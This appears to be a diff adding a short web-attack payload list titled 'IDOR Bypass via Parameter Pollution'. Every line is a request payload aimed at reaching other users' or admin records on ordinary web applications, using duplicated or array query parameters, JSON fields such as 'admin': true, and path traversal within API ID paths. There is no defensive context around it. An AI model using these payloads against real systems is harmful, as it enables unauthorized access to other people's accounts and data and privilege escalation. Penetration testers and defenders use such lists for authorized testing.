@@ -1,0 +1,17 @@
+# IDOR Bypass via Parameter Pollution (HPP)
+
+# Multiple Parameter Occurrence
+?id=VALID_ID&id=VICTIM_ID
+?user_id=YOUR_ID&user_id=ADMIN_ID
+
+# Array Based Pollution
+?id[]=YOUR_ID&id[]=VICTIM_ID
+{"id": ["YOUR_ID", "VICTIM_ID"]}
+
+# JSON Logic Bypass
+{"id": YOUR_ID, "user_id": VICTIM_ID}
+{"user_id": YOUR_ID, "admin": true}
+
+# Path Traversal in ID
+/api/v1/user/YOUR_ID/../VICTIM_ID
+/api/v1/profile/current/../../admin/1
